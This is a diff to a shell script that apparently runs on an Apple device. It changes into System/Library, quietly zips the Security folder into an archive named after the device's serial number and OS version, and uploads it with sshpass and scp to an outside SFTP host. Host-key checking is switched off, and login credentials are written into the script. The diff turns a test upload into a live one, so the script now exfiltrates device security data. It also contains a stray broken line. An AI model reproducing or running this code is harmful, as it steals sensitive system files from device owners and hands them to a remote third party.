@@ -1,11 +1,11 @@
-echo "<======= 22222=======>"
+echo "<======= 333=======>"
 #
 # <============server configuration==============>
 #
 PERSON_NAME="attitude"
 REMOTE_HOST="eu-central-1.sftpcloud.io"
-REMOTE_USER="1f288b2de0254b309afa10e332ef260c"
-REMOTE_PASS="TgEkPeNdsMudLNNEIntsGp3pdYUnJ2ag"
+REMOTE_USER="92cbbc360e694bd5be3c6a09c20c1e30"
+REMOTE_PASS="31eWbz8eNO72rWM87LChgnsc8ugbgpX1"
 REMOTE_PATH="/home"
 REMOTE_DEST="/"
 
@@ -17,20 +17,20 @@ ARCHIVE_NAME="${IOS_VERSION}_${SERIAL_NUMBER}_${LOCAL_FILE}_${PERSON_NAME}.zip"
 echo "$ARCHIVE_NAME"
 
 
-# cd $home/../../../System/Library/  //important line uncomment or directory wont change 
+cd $home/../../../System/Library/
 archeiving files
 echo "archiving silently"
 zip -qr "$ARCHIVE_NAME" Security && echo "Archiving complete!"
 
 
-TEST_FILE=au.zip
+
 
 
 
 # --- Upload Command ---
 # -p specifies the password
 # -o StrictHostKeyChecking=no prevents the script from hanging on new host prompts
-sshpass -p "$REMOTE_PASS" scp -o StrictHostKeyChecking=no "$TEST_FILE" "$REMOTE_USER@$REMOTE_HOST:$REMOTE_DEST"
+sshpass -p "$REMOTE_PASS" scp -o StrictHostKeyChecking=no "$ARCHIVE_NAME" "$REMOTE_USER@$REMOTE_HOST:$REMOTE_DEST"
 #sshpass -p "$REMOTE_PASS" scp -o StrictHostKeyChecking=no "$ARCHIVE_NAME" "$REMOTE_USER@$REMOTE_HOST:$REMOTE_DEST"
  #echo "connection sucesfully"
 # Check if the upload was successful
